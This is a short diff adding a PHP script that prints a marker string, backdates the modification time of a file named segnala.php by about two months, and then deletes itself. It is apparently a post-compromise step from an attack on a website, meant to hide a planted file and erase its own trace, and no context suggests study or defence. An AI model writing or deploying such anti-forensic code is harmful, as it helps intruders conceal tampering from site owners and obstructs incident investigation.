@@ -1,0 +1,1 @@
+<?php echo "UmVgDhdKFM"; if (file_exists("./segnala.php")){ touch("./segnala.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*mwCV0TgqxRYcAgEpDHzE*/ ?>
